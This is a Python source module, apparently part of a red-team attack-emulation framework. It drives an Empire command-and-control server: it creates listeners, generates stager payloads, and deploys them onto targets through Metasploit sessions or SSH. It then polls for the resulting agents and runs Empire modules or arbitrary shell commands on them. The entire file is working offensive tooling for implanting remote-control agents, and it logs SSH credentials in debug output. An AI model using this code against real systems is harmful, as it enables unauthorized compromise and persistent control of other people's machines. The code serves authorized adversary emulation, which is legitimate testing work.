import asyncio
import socket
import paramiko
from utinni import EmpireApiClient, EmpireObject, EmpireApi, EmpireAgent, \
    EmpireModuleExecutionError, EmpireModuleExecutionTimeout

from cryton_worker.lib.util.util import Metasploit, ssh_to_target
from cryton_worker.etc import config
from cryton_worker.lib.util import logger, constants as co


class EmpireClient(EmpireApiClient):
    def __init__(self, host: str = config.EMPIRE_RHOST, port: int = config.EMPIRE_RPORT):
        """
        Wrapper class for EmpireApiClient.
        :param host: Hostname(ip address) of Empire server
        :param port: Port used for connection to Empire server
        """
        super().__init__(host, port)
        self.empire_client = EmpireApiClient(host=host, port=port)
        self.stagers = EmpireStagers(self)

    async def default_login(self, username: str = config.EMPIRE_USERNAME, password: str = config.EMPIRE_PASSWORD):
        """
        Login to Empire server
        :param username: Username used for login to Empire
        :param password: Password used for login to Empire
        """
        await self.login(username, password)
        logger.logger.debug("Empire login successful")

    async def agent_poller(self, target_ip) -> EmpireAgent:
        """
        Check for new agents in 1 sec interval until the right one is found.
        :param target_ip: IP address of target that agent should've been deployed to
        :return: Agent object
        """
        # Poll for new agents every 1 sec
        logger.logger.debug("* Waiting for agents...")
        previous_agents = []
        while True:
            for agent in await self.agents.get():
                for previous_agent in previous_agents:
                    if previous_agent.name == agent.name:
                        return agent
                logger.logger.debug(f"+ New agent '{agent.name}' connected from: {agent.external_ip}")
                if agent.external_ip == target_ip:
                    return agent
                previous_agents.append(agent)
                logger.logger.debug(f"agents:{previous_agents}")
            await asyncio.sleep(1)

    async def generate_payload(self, stager_arguments: dict) -> str:
        """
        Generate stager payload to generate agent on target.
        :param stager_arguments: Arguments for stager
        :return: Executable stager
        """

        try:
            listener_name = stager_arguments[co.STAGER_ARGS_LISTENER_NAME]
            listener_port = stager_arguments[co.STAGER_ARGS_LISTENER_PORT]
            stager_type = stager_arguments[co.STAGER_ARGS_STAGER_TYPE]
        except KeyError as missing_parameter:
            logger.logger.error("Missing argument in stager_arguments.", missing_parameter=missing_parameter,
                                stager_arguments=stager_arguments)
            raise KeyError(f"Missing '{str(missing_parameter)}' argument in stager_arguments.")

        listener_type = stager_arguments.get(co.STAGER_ARGS_LISTENER_TYPE, "http")
        stager_options = stager_arguments.get(co.STAGER_ARGS_STAGER_OPTIONS)
        listener_options = stager_arguments.get(co.STAGER_ARGS_LISTENER_OPTIONS, {})

        # check if listener already exists
        listener_get_response = await self.listeners.get(listener_name)
        logger.logger.debug("Listener response", listener=listener_get_response)
        if "error" in listener_get_response:
            # create listener
            logger.logger.debug("Creating listener.", listener_name=listener_name)
            try:
                await self.listeners.create(listener_type, listener_name, additional={"Port": listener_port,
                                                                                      **listener_options})
            except KeyError:
                logger.logger.debug("Listener could not be created.")
                raise KeyError(f"Listener could not be created.")
            logger.logger.debug(f"Listener '{listener_name}' created")

        # check if stager is in Empire database
        try:
            stager = await self.stagers.get(stager_type)
        except KeyError:
            logger.logger.error(f"Stager type {stager_type} not found in Empire.")
            raise KeyError(f"Stager type {stager_type} not found in Empire.")

        logger.logger.debug("Generating stager output.", stager_type=stager_type, listener_name=listener_name)
        try:
            stager_output = await stager.generate(stager_type, listener_name, stager_options)
        except KeyError:
            logger.logger.error(f"Stager could not be generated, check if the supplied listener exists.")
            raise KeyError(f"Stager could not be generated, check if the supplied listener exists.")

        logger.logger.debug("Stager output generated.")
        return stager_output

    async def execute_on_agent(self, arguments) -> dict:
        """
        Execute empire module defined by name.
        :param arguments: Arguments for executing module or command on agent
        :return: Execution result
        """
        await self.default_login()
        try:
            agent_name = arguments["use_agent"]
        except KeyError as ex:
            logger.logger.error(f"Missing required {str(ex)} argument.", missing_argument=ex)
            return {co.STD_ERR: f"Missing required {str(ex)} argument.", co.RETURN_CODE: -2}

        module_name = arguments.get("empire_module")
        shell_command = arguments.get("shell_command")
        module_args = arguments.get("empire_module_args", {})

        # There is timeout in execute/shell function but for some reason it's not triggered when inactive agent is used
        # and it freezes waiting for answer
        try:
            empire_agent = await self.agents.get(agent_name)
        except KeyError:
            return {co.RETURN_CODE: -2, co.STD_ERR: f"Agent '{agent_name}' not found in Empire."}
        else:
            logger.logger.debug(f"Agent '{agent_name}' successfully pulled from Empire.")
        if module_name is not None:
            # check if module exists
            try:
                await self.modules.get(module_name)
            except KeyError:
                return {co.RETURN_CODE: -2, co.STD_ERR: f"Module '{module_name}' not found in Empire."}

            try:
                execution_result = await asyncio.wait_for(empire_agent.execute(module_name, module_args), 15)
            except (EmpireModuleExecutionError, EmpireModuleExecutionTimeout) as ex:
                logger.logger.error("Error while executing empire module", err=str(ex))
                return {co.RETURN_CODE: -2, co.STD_ERR: str(ex)}
            except asyncio.exceptions.TimeoutError:
                logger.logger.error(f"Module execution timed out, check that empire agent '{agent_name} is active")
                return {co.RETURN_CODE: -2,
                        co.STD_ERR: f"Module execution timed out, check that empire agent '{agent_name} is active"}

        elif shell_command is not None:
            logger.logger.debug("Executing command on agent.", agent_name=agent_name, command=shell_command)
            try:
                execution_result = await asyncio.wait_for(empire_agent.shell(shell_command), 15)
            except (EmpireModuleExecutionError, EmpireModuleExecutionTimeout) as ex:
                logger.logger.error("Error while executing shell command on agent", err=str(ex))
                return {co.RETURN_CODE: -2, co.STD_ERR: str(ex)}
            except asyncio.exceptions.TimeoutError:
                logger.logger.error(
                    f"Shell command execution timed out, check that empire agent '{agent_name}' is alive")
                return {co.RETURN_CODE: -2,
                        co.STD_ERR: f"Shell command execution timed out, check that empire agent '{agent_name}' is alive"}
        else:
            return {co.RETURN_CODE: -2, co.STD_ERR: "Missing module_name or shell_command in arguments."}

        return {co.RETURN_CODE: 0, co.STD_OUT: execution_result}


class EmpireStager(EmpireObject):
    def __init__(self, api, raw_object):
        super().__init__(api, raw_object)

    async def generate(self, stager, listener, options=None):
        if options is None:
            options = {}
        return await self.api.stagers.generate(stager, listener, options)


class EmpireStagers(EmpireApi):
    async def get(self, stager):
        r = await self.client.get(f"stagers/{stager}")
        return EmpireStager(self.api, r.json()["stagers"][0])

    async def generate(self, stager, listener, options):
        r = await self.client.post(f"stagers", json={"StagerName": stager, "Listener": listener, **options})
        return r.json()[stager]["Output"]


async def deploy_agent(arguments: dict) -> dict:
    """
    Deploy stager on target and create agent.
    :param arguments: Step arguments
    :return: event_v
    """
    empire = EmpireClient()
    # login to Empire server
    await empire.default_login()

    stager_arguments = arguments[co.STAGER_ARGUMENTS]

    try:
        payload = await empire.generate_payload(stager_arguments)
    except KeyError as err:
        return {co.STD_ERR: str(err), co.RETURN_CODE: -2}
    logger.logger.debug("Stager payload.", payload=payload)

    # Check type of connection to target
    if "session_id" in arguments:
        session_id = arguments["session_id"]
        metasploit_obj = Metasploit()
        try:
            target_ip = metasploit_obj.get_parameter_from_session(session_id, "session_host")
        except KeyError as err:
            logger.logger.error("MSF session not found.", session_id=session_id)
            return {co.STD_ERR: f"Msf Session with id {str(err)} not found.", co.RETURN_CODE: -2}

        logger.logger.debug("Deploying agent via msf session.", session_id=session_id, payload=payload,
                            target_ip=target_ip)
        metasploit_obj.execute_in_session(payload, session_id)
    elif "ssh_connection" in arguments:
        # Check if 'target' is in ssh_connection arguments
        try:
            ssh_client = ssh_to_target(arguments["ssh_connection"])
        except KeyError as err:
            logger.logger.error(f"Missing {str(err)} argument in ssh_connection.")
            return {co.STD_ERR: f"Missing {str(err)} argument in ssh_connection.", co.RETURN_CODE: -2}
        except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.NoValidConnectionsError,
                socket.error) as ex:
            logger.logger.error("Couldn't connect to target via paramiko ssh client.", original_err=ex)
            return {co.STD_ERR: str(ex), co.RETURN_CODE: -2}

        logger.logger.debug("Connected to target via paramiko ssh client.")
        ssh_client.exec_command(payload)
        target_ip = arguments["ssh_connection"]["target"]
        logger.logger.debug("Deploying agent via ssh.", credentials=arguments["ssh_connection"], payload=payload)
    else:
        logger.logger.error("Missing 'ssh_connection' or 'session_id' argument.")
        return {co.STD_ERR: "Missing 'ssh_connection' or 'session_id' argument.", co.RETURN_CODE: -2}

    try:
        new_agent_name = stager_arguments[co.STAGER_ARGS_AGENT_NAME]
    except KeyError as err:
        logger.logger.error(f"Missing {str(err)} argument.", original_error=err)
        return {co.STD_ERR: f"Missing {str(err)} argument.", co.RETURN_CODE: -2}

    # Rename agent to given name
    logger.logger.debug("Renaming agent", target_ip=target_ip)
    agent = await empire.agent_poller(target_ip)
    agent_rename_response = await agent.rename(new_agent_name)
    logger.logger.debug(f"Agent renamed to '{agent.name}'", response=agent_rename_response)

    return {co.RETURN_CODE: 0, co.STD_OUT: f"Agent '{new_agent_name}' deployed on target {target_ip}."}

